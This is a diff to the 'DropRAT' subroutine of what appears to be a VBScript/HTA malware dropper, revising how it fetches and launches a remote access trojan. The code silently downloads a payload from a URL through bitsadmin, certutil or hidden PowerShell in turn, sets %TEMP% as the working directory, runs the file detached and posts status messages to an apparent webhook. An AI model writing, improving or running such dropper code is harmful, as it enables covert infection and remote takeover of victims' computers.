@@ -151,29 +151,36 @@ Sub DropRAT()
     
     If fso.FileExists(temp) Then fso.DeleteFile temp
 
-    ' Try bitsadmin first
-    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+    Call PostEmbed("📦 RAT Download", "Fetching payload...", 3447003)
+
+    ' 1. Try bitsadmin in the background
+    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, False
     
-    ' Fallback: certutil
+    ' Wait 5 seconds to see if bitsadmin worked
+    Call SleepSeconds(5)
+
+    ' 2. Fallback to certutil if bitsadmin failed/hung
     If Not fso.FileExists(temp) Then
         sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     End If
     
-    ' Fallback: PowerShell
+    ' 3. Fallback to PowerShell if certutil failed
     If Not fso.FileExists(temp) Then
         sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
     End If
     
-    ' Run if downloaded
+    ' 4. Run if downloaded
     If fso.FileExists(temp) Then
-        ' THE FIX: Set Working Directory to %TEMP% so PyInstaller doesn't crash
+        Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
+        
+        ' Set Working Directory so PyInstaller doesn't crash
         sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
         
-        ' Launch detached via cmd so it survives after the HTA closes
+        ' Launch detached
         sh.Run "cmd.exe /c start """" """ & temp & """", 0, False
         Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
     Else
-        Call PostEmbed("⌛ RAT Error", "Download failed on all methods.", 16711680)
+        Call PostEmbed("⌛ RAT Error", "Download failed on all methods. Link is likely expired.", 16711680)
     End If
 End Sub
 
